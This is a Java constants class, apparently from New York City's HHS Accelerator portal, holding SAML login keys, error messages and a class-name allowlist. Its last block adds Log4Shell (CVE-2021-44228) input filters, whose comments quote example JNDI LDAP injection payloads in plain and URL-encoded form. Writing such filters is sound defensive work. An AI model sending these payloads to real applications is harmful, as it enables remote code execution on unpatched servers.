    public static final String  SAML_NYC_ID_LOGIN_STATIC_PROP_INX =   "SAML_NYC_ID_LOGIN_STATIC" ;
    public static final String  SAML_NYC_ID_LOGOUT_STATIC_PROP_INX =   "SAML_NYC_ID_LOGOUT_STATIC" ;
    
    public static final String SAML_NYCID_WEB_SERVICE_URI = "SAML_NYCID_WEB_SERVICE_URI";
	public static final String SAML_NYCID_WEB_SERVICE_PASSWORD = "SAML_NYCID_WEB_SERVICE_PASSWORD"; 
	public static final String SAML_NYCID_WEB_SERVICE_USER = "SAML_NYCID_WEB_SERVICE_USER"; 
    
    public static final String              SAML_ATTR_GUID_KEY                                                       = "GUID";
    public static final String              SAML_ATTR_EMAIL_KEY                                                      = "mail";
    public static final String              SAML_ATTR_FIRST_NAME_KEY                                                 = "givenName";
    public static final String              SAML_ATTR_M_NAME_KEY                                                     = "middleName";
    public static final String              SAML_ATTR_LAST_NAME_KEY                                                  = "sn";
    public static final String              SAML_ATTR_EMAIL_VALIDATION_KEY                                           = "nycExtEmailValidationFlag";
    public static final String              SAML_ATTR_VERSION_KEY                                                    = "nycExtTOUVersion";
    public static final String              SAML_ATTR_USER_TYPE_KEY                                                  = "userType";
    public static final String              GET_ALL_ACTIVE_ORG_STAFF                                                 = "getAllActiveOrgStaff";
    public static final String              ALL_STAFF_DETAILS_LIST                                                   = "allStaffDetailsList";
    
    public static final String              SAML_CONFIRM_UPDATE_PROFILE_VIEW_ID                                      = "samlConfirmProfileChangeView";
    public static final String              SAML_CONFIRM_UPDATE_PROFILE_DLG_ID                                       = "confirmUpdateProfileDlg";
        
    public static final String              SAML_PROFILE_ERR_NO_NAME                                           = "Your NYC.ID profile is incomplete. HHS Accelerator requires NYC.ID profiles to contain <b>both</b> First and Last Names. Please update your <a title='update your NYC.ID profile.' onclick='profilepage()' href='#' id='newProfileWin' name='newProfileWin' style='text-decoration: none; border-bottom: 1px solid red;'> NYC.ID</a> profile. NYC.ID takes several minutes to synchronize with HHS Accelerator, therefore you may not log into HHS Accelerator immediately.";
    public static final String              SAML_PROFILE_ERR_NO_EMAIL                                          = "Your NYC.ID profile is incomplete. HHS Accelerator requires your NYC.ID to be in the form of an email address. Please replace your Username with a valid Email Address in your <a title='update your NYC.ID profile.' href='#' onclick='profilepage()' id='newProfileWin' name='newProfileWin' style='text-decoration: none; border-bottom: 1px solid red;'> NYC.ID</a> profile. NYC.ID takes several minutes to synchronize with HHS Accelerator, therefore you may not log into HHS Accelerator immediately.";
    public static final String				USER_ACTIVE_STATUS_MESSAGE = "Your request for access has been submitted to your organization's account administrator. You will be notified when a decision has been made.";
  //public static final String				USER_ACTIVE_STATUS_MESSAGE = "Your organization's HHS Accelerator account request is currently in review.<BR> You will be notified of a decision shortly.<BR>Please add noreplyplease@hhsaccelerator.nyc.gov to your email contacts safe list in order to receive HHS Accelerator notifications.";
    /*
    public static final String				ERROR_MESSAGE_CONCURRENT =  "An existing session for this NYC.ID has been detected. <br>" +
																		"For security reasons, you may only be logged into a single session at a time. <br>" +
																		"Avoid accessing NYC.ID City applications across different devices and browsers to prevent session interruptions.";
    */
    //** [End] QC 9165 R 7.8.0
    // [Start] QC 9205  R 8.0.0
    public static final String              SAML_ATTR_ENTRY_DN                                                          = "entryDN";
    public static final String              SAML_ATTR_GROUP_MEMBERSHIP                                                  = "groupMembership";
    public static final String              SAML_ATTR_EMAIL                                                             = "email";
    public static final String              SAML_ATTR_FIRST_NAME                                                        = "first_name";
    public static final String              SAML_ATTR_LAST_NAME                                                         = "last_name";
    public static final String              SAML_DEPROVISION_USER_ERR                                           		= "You are not provisioned with user access to HHS Accelerator.<br> To request access to HHS Accelerator, please submit a request to <a href='mailto:accounts@hhsaccelerator.nyc.gov'>accounts@hhsaccelerator.nyc.gov</a>. <br>In the email request, specify your full name, title, Agency, and role at your organization.";

    //[Start] QC9442 R8.0.1 Update Language   and R9.6.1 QC9693
    //public static final String              SAML_MULTIGROUP_USER_ERR                                           		    = "HHS Accelerator is unable to recognize your user role.<br> Please send the following information to <a href='mailto:accounts@hhsaccelerator.nyc.gov'>accounts@hhsaccelerator.nyc.gov</a> so we can make the proper updates to your profile:<br> (1) Full Name <br> (2) Title <br> (3) Agency <br> (4) Role at your organization  <br> If you are unsure what your user role should be in HHS Accelerator, please contact your Agency Liaison.";
    //[End] QC9442 R8.0.1  Update Language    and R9.6.1 QC9693

    /* QC9713 messgage is moved to logoutredirect.jsp page */
    //public static final String              SAML_MULTIGROUP_USER_ERR                                           		    = "<i>HHS Accelerator is unable to recognize your user role.<br> For proper updates, please submit a request via our <a href='https://mocssupport.atlassian.net/servicedesk/customer/portal/8' style='text-decoration: none' target=_blank>MOCS Service Desk</a> contact form.  In the form, select <b>HHS Accelerator -- > Agency Provisioning</b> and include the following information:</i><br> (1)	Full Name <br> (2)	Title <br> (3)	Agency <br> (4)	User role for your organization <br/><br/> <i>If you are unsure what your user role should be in HHS Accelerator, before submitting your request, please contact the MOCS Liaison for your agency.</i>";
    

    public static final String  			SAML_NYC_ID_LOGOUT_PROP_INX_CITY 											= "SAML_NYC_ID_LOGOUT_CITY" ;
    public static final String  			SAML_NYC_ID_LOGIN_STATIC_PROP_INX_CITY 										= "SAML_NYC_ID_LOGIN_STATIC_CITY" ;
    public static final String  			SAML_NYC_ID_LOGOUT_STATIC_PROP_INX_CITY 									= "SAML_NYC_ID_LOGOUT_STATIC_CITY" ;
    public static final String				ERROR_MESSAGE_CONCURRENT                                                    ="An existing HHS Accelerator login session with for this user has been detected.<br> You may be logged into HHS Accelerator through another device or a different browser.<br>  For security reasons, you may only be logged in to HHS Accelerator one session at a time.<br> Please log out from the existing session to continue.";                                                       
    //public static final String              SAML_CITY_PROFILE_ERR_MSG  = "Your Citywide LDAP user profile is missing one or more of the following attributes: First Name, Last Name, or Email Address. To update your LDAP user profile, please contact your city agency"+"’"+"s local IT team.";
    public static final String              SAML_CITY_PROFILE_ERR_MSG  = "Your Citywide LDAP user profile is missing one or more of the following attributes: First Name or Last Name. To update your LDAP user profile, please contact your city agency"+"'"+"s local IT team.";
    public static final String              SAML_NYC_ID_LOGIN_STATIC_CITY  = "SAML_NYC_ID_LOGIN_STATIC_CITY";
    // [End] QC 9205  R 8.0.0
    //[Start] QC9401 R 8.5.0
    public static final String				ERROR_MESSAGE_REPORT                                                        ="No Records Found" ;
    //[End] QC9401 R 8.5.0
    //[Start] QC 9528 R 8.5.0 - Null Pointer Exception thrown when logging into Accelerator Internal site
    public static final String              SAML_CITY_ENTRYDN_ERR_MSG  = "<span style='color: red;'>An internal error has occurred.</span> Please click the <b>Log Out</b> button and attempt to log in to HHS Accelerator again.";
    //[End] QC 9528 R 8.5.0 - Null Pointer Exception thrown when logging into Accelerator Internal site
  //Start QC 9587 R 8.10.0 add MOCS Contact button for Provider
    public static final String  JIRA_DATA_KEY =   "JIRA_DATA_KEY" ;
    //End QC 9587 R 8.10.0 add MOCS Contact button for Provider
    //*** Start R 9.1 QC 9611 - Update in-system notifications and alerts for CHAR 500 ***
 	public static final String  PASSPORT_SHARED_DOCUMENT_ALERT_NOTIFICATION_LINK 										= "https://www1.nyc.gov/site/mocs/systems/about-go-to-passport.page";
 	//*** End R 9.1 QC 9611 - Update in-system notifications and alerts for CHAR 500 ***
	
 	//Start R 9.2 QC 9651
	public static final String NT003 = "NT003";
	public static final String NT006 = "NT006";
	public static final String NT007 = "NT007";
	public static final String NT009 = "NT009";
	public static final String NT010 = "NT010";
	public static final String AL010 = "AL010";
	public static final String AL011 = "AL011";
	public static final String AL003 = "AL003";
	public static final String AL005 = "AL005";
	public static final String AL008 = "AL008";
	
	//End R 9.2 QC 9651      

	/* [Start] R9.3.0 QC9646    */
	public static final String MODEL_VALIDATION_APP_COMPONENT_NAME= "ModelValidation";
	public static final String MODEL_VALIDATION_APP_SETTING_NAME= "ValidationFlag";
	/* [End] R9.3.0 QC9646    */

	/* [Start] R9.3.1 QC9646    */
	public static final String KEY_SESSION_USER_TOKEN = "_USER_INFO_";
	public static final String CHECK_PERMISION_FOR_DOC = "checkPermisionForDoc";
	/* [End] R9.3.1 QC9646    */
	
	// Start QC9665 R 9.3.2
	public static final String SESSION_EXTENDED_DOCUMENT_LIST = "extendedDocumentList";
	// End QC9665 R 9.3.2
	
	/* [Start] R9.4.0 qc_9634 -- Vuln 1: CWE 470 - Use of Externally Controlled Input to Select Classes or Code ('Unsafe Reflection')   */
	public static final Map<String, String> GRID_BEAN_NAME_MAP = new HashMap<String, String>();
	static
	{
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.AutoApprovalConfigBean","com.nyc.hhs.model.AutoApprovalConfigBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.ContractBudgetBean","com.nyc.hhs.model.ContractBudgetBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.SalaryBean","com.nyc.hhs.model.SalaryBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.AdvanceSummaryBean","com.nyc.hhs.model.AdvanceSummaryBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBIndirectRateBean","com.nyc.hhs.model.CBIndirectRateBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBProfessionalServicesBean","com.nyc.hhs.model.CBProfessionalServicesBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBGridBean","com.nyc.hhs.model.CBGridBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.AssignmentsSummaryBean","com.nyc.hhs.model.AssignmentsSummaryBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.RateBean","com.nyc.hhs.model.RateBean");	
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.PersonnelServiceBudget","com.nyc.hhs.model.PersonnelServiceBudget");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBOperationSupportBean","com.nyc.hhs.model.CBOperationSupportBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBEquipmentBean","com.nyc.hhs.model.CBEquipmentBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBUtilities","com.nyc.hhs.model.CBUtilities");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.Rent","com.nyc.hhs.model.Rent");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.ContractedServicesBean","com.nyc.hhs.model.ContractedServicesBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBMileStoneBean","com.nyc.hhs.model.CBMileStoneBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.UnallocatedFunds","com.nyc.hhs.model.UnallocatedFunds");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBProgramIncomeBean","com.nyc.hhs.model.CBProgramIncomeBean");
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.CBServicesBean","com.nyc.hhs.model.CBServicesBean");		
		GRID_BEAN_NAME_MAP.put("com.nyc.hhs.model.PaymentChartOfAllocation","com.nyc.hhs.model.PaymentChartOfAllocation");	
		
	}
	public static final Map<String, String> REPORT_EMITTER_CLASS_NAME_MAP = new HashMap<String, String>();
	static
	{
		REPORT_EMITTER_CLASS_NAME_MAP.put("com.nyc.hhs.report.extension.ExportCSVReport","com.nyc.hhs.report.extension.ExportCSVReport");		
		
	}	
	/* [End] R9.4.0 qc_9634 -- Vuln 1: CWE 470 - Use of Externally Controlled Input to Select Classes or Code ('Unsafe Reflection')   */
	
	/* [Start] Start R9.5.0 qc_9670 Remote Command Execution in Log4J (CVE-2021-44228) Vulnerability from IBM App Scan report (part 2 -- filtering by hhsportal for paramters in html form through post method )  */
	public static Pattern[] RCE_PATTERNS = new Pattern[] {
		// ${jndi...} or ${${...}}
		// %24 -->$
		// %7B --> {
		// %3A --> :
		// %2F -->/
		// %24%7Bjndi%3Aldap%3A%2F%2FHOST%3A1389%2F%2FBasic%2F%2FCommand%2F%2Fcal%7D
		// .*(\$\{\s*)+jndi:ldap.*\}.*
		// ${jndi:ldap://HOST:1389/Basic/Command/cal}
		Pattern.compile(".*((\\$\\{|%24%7[bB])\\s*)+jndi(:|%3[aA])ldap.*",
				Pattern.CASE_INSENSITIVE | Pattern.MULTILINE
						| Pattern.DOTALL),
		// .*((\$\{|%24%7[bB])\s*){2,}.*
		Pattern.compile(".*((\\$\\{|%24%7[bB])\\s*){2,}.*",
				Pattern.CASE_INSENSITIVE | Pattern.MULTILINE
						| Pattern.DOTALL), };
	/* [End] Start R9.5.0 qc_9670 Remote Command Execution in Log4J (CVE-2021-44228) Vulnerability from IBM App Scan report (part 2 -- filtering by hhsportal for paramters in html form through post method )  */
}  